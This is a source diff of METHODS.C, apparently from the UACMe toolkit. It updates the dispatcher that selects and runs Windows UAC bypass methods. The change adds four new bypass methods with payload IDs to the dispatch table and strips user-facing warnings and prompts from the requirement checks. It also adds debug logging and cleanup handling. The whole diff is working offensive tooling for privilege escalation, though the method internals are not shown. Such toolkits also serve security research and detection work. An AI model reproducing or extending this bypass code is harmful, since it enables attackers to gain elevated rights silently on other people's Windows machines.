@@ -4,9 +4,9 @@
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     3.59
+*  VERSION:     3.63
 *
-*  DATE:        04 Feb 2022
+*  DATE:        16 Jul 2022
 *
 *  UAC bypass dispatch.
 *
@@ -46,6 +46,10 @@ UCM_API(MethodProtocolHijack);
 UCM_API(MethodPca);
 UCM_API(MethodCurVer);
 UCM_API(MethodMsdt);
+UCM_API(MethodDotNetSerial);
+UCM_API(MethodVFServerTaskSched);
+UCM_API(MethodVFServerDiagProf);
+UCM_API(MethodIscsiCpl);
 
 ULONG UCM_WIN32_NOT_IMPLEMENTED[] = {
     UacMethodWow64Logger,
@@ -57,7 +61,9 @@ ULONG UCM_WIN32_NOT_IMPLEMENTED[] = {
     UacMethodMsSettingsProtocol,
     UacMethodMsStoreProtocol,
     UacMethodPca,
-    UacMethodCurVer
+    UacMethodCurVer,
+    UacMethodVFServerTaskSched,
+    UacMethodVFServerDiagProf
 };
 
 UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
@@ -133,7 +139,11 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodPca, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodCurVer, { NT_WIN10_THRESHOLD1, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
     { MethodNICPoison, { NT_WIN7_RTM, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodMsdt, { NT_WIN10_THRESHOLD1, MAXDWORD }, FUBUKI32_ID, FALSE, FALSE, TRUE }
+    { MethodMsdt, { NT_WIN10_THRESHOLD1, MAXDWORD }, FUBUKI32_ID, FALSE, FALSE, TRUE },
+    { MethodDotNetSerial, { NT_WIN7_RTM, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
+    { MethodVFServerTaskSched, { NT_WIN8_BLUE, MAXDWORD}, AKATSUKI_ID, FALSE, TRUE, TRUE },
+    { MethodVFServerDiagProf, { NT_WIN7_RTM, MAXDWORD}, AKATSUKI_ID, FALSE, TRUE, TRUE },
+    { MethodIscsiCpl, { NT_WIN7_RTM, MAXDWORD }, FUBUKI32_ID, FALSE, FALSE, TRUE },
 };
 
 /*
@@ -169,13 +179,11 @@ NTSTATUS IsMethodMatchRequirements(
 #ifdef _DEBUG
     UNREFERENCED_PARAMETER(Entry);
 #else
-    WCHAR szMessage[MAX_PATH];
     //
     //  Check Wow64 flags first. Disable this check for debugging build.
     //
     if (g_ctx->IsWow64) {
         if (Entry->DisallowWow64) {
-            ucmShowMessageById(g_ctx->OutputToDebugger, ISDB_USAGE_WOW_DETECTED);
             return STATUS_NOT_SUPPORTED;
         }
     }
@@ -185,7 +193,6 @@ NTSTATUS IsMethodMatchRequirements(
         // Not required if Win32.
         //
         if (Entry->Win32OrWow64Required != FALSE) {
-            ucmShowMessageById(g_ctx->OutputToDebugger, ISDB_USAGE_WOW64WIN32ONLY);
             return STATUS_NOT_SUPPORTED;
         }
     }
@@ -195,19 +202,10 @@ NTSTATUS IsMethodMatchRequirements(
     //  Check availability. Disable this check for debugging build.
     //
     if (g_ctx->dwBuildNumber < Entry->Availability.MinumumWindowsBuildRequired) {
-        RtlSecureZeroMemory(&szMessage, sizeof(szMessage));
-        _strcpy(szMessage, L"Current Windows Build: ");
-        ultostr(g_ctx->dwBuildNumber, _strend(szMessage));
-        _strcat(szMessage, L"\nMinimum Windows Build Required: ");
-        ultostr(Entry->Availability.MinumumWindowsBuildRequired, _strend(szMessage));
-        _strcat(szMessage, L"\nAborting execution.");
-        ucmShowMessage(g_ctx->OutputToDebugger, szMessage);
         return STATUS_NOT_SUPPORTED;
     }
     if (g_ctx->dwBuildNumber >= Entry->Availability.MinimumExpectedFixedWindowsBuild) {
-        if (ucmShowQuestionById(ISDB_USAGE_UACFIX) == IDNO) {
-            return STATUS_NOT_SUPPORTED;
-        }
+        return STATUS_NOT_SUPPORTED;
     }
 #endif
     return STATUS_SUCCESS;
@@ -225,6 +223,8 @@ VOID PostCleanupAttempt(
     _In_ UCM_METHOD Method
 )
 {
+    BOOL bHit = TRUE;
+
     switch (Method) {
 
     case UacMethodDISM:
@@ -233,6 +233,7 @@ VOID PostCleanupAttempt(
         break;
 
     case UacMethodWow64Logger:
+    case UacMethodVFServerDiagProf:
         ucmMethodCleanupSingleItemSystem32(WOW64LOG_DLL);
         break;
 
@@ -248,9 +249,17 @@ VOID PostCleanupAttempt(
         ucmHakrilMethodCleanup();
         break;
 
-    default:
+    case UacMethodIscsiCpl:
+        ucmIscsiCplMethodCleanup();
         break;
+
+    default:
+        bHit = FALSE;
+        break;
+
     }
+
+    ucmConsolePrintValueUlong(TEXT("[+] PostCleanupAttempt for method"), (ULONG)Method, FALSE);
 }
 
 /*
@@ -279,8 +288,9 @@ NTSTATUS MethodsManagerCall(
         return STATUS_NOT_SUPPORTED;
     }
 
-    if (Method >= UacMethodMax)
+    if (Method >= UacMethodMax) {
         return STATUS_INVALID_PARAMETER;
+    }
 
     //
     // Is method implemented for Win32?
@@ -299,6 +309,9 @@ NTSTATUS MethodsManagerCall(
     Status = IsMethodMatchRequirements(Entry);
     if (!NT_SUCCESS(Status))
         return Status;
+
+    ucmConsolePrintValueUlong(TEXT("[+] MethodsManagerCall->Method"), Method, FALSE);
+    ucmConsolePrintValueUlong(TEXT("[+] MethodsManagerCall->Entry->PayloadResourceId"), Entry->PayloadResourceId, TRUE);
 
     if (Entry->PayloadResourceId != PAYLOAD_ID_NONE) {
 
@@ -320,6 +333,8 @@ NTSTATUS MethodsManagerCall(
     ParamsBlock.PayloadCode = PayloadCode;
     ParamsBlock.PayloadSize = PayloadSize;
 
+    ucmConsolePrintValueUlong(TEXT("[+] MethodsManagerCall->Entry->SetParameters"), Entry->SetParameters, FALSE);
+
     //
     // Set shared parameters.
     //
@@ -328,6 +343,7 @@ NTSTATUS MethodsManagerCall(
     //
     if (Entry->SetParameters) {
         bParametersBlockSet = supCreateSharedParametersBlock(g_ctx);
+        ucmConsolePrintValueUlong(TEXT("[+] MethodsManagerCall->bParametersBlockSet"), bParametersBlockSet, FALSE);
     }
 
     MethodResult = Entry->Routine(&ParamsBlock);
@@ -342,7 +358,8 @@ NTSTATUS MethodsManagerCall(
     //
     if (Entry->SetParameters) {
         if (bParametersBlockSet) {
-            supWaitForGlobalCompletionEvent();
+            Status = supWaitForGlobalCompletionEvent();
+            ucmConsolePrintStatus(TEXT("[+] MethodsManagerCall->supWaitForGlobalCompletionEvent"), Status);
             supDestroySharedParametersBlock(g_ctx);
         }
     }
@@ -703,8 +720,6 @@ UCM_API(MethodProtocolHijack)
         }
         break;
 
-    default:
-        break;
     }
 
     return Result;
@@ -752,6 +767,41 @@ UCM_API(MethodCurVer)
 UCM_API(MethodMsdt)
 {
     return ucmMsdtMethod(
+        Parameter->PayloadCode,
+        Parameter->PayloadSize);
+}
+
+UCM_API(MethodDotNetSerial)
+{
+    LPWSTR lpszPayload = NULL;
+
+    UNREFERENCED_PARAMETER(Parameter);
+
+    if (g_ctx->OptionalParameterLength == 0)
+        lpszPayload = g_ctx->szDefaultPayload;
+    else
+        lpszPayload = g_ctx->szOptionalParameter;
+
+    return ucmDotNetSerialMethod(lpszPayload);
+}
+
+UCM_API(MethodVFServerTaskSched)
+{
+    return ucmVFServerTaskSchedMethod(
+        Parameter->PayloadCode,
+        Parameter->PayloadSize);
+}
+
+UCM_API(MethodVFServerDiagProf)
+{
+    return ucmVFServerDiagProfileMethod(
+        Parameter->PayloadCode,
+        Parameter->PayloadSize);
+}
+
+UCM_API(MethodIscsiCpl)
+{
+    return ucmIscsiCplMethod(
         Parameter->PayloadCode,
         Parameter->PayloadSize);
 }
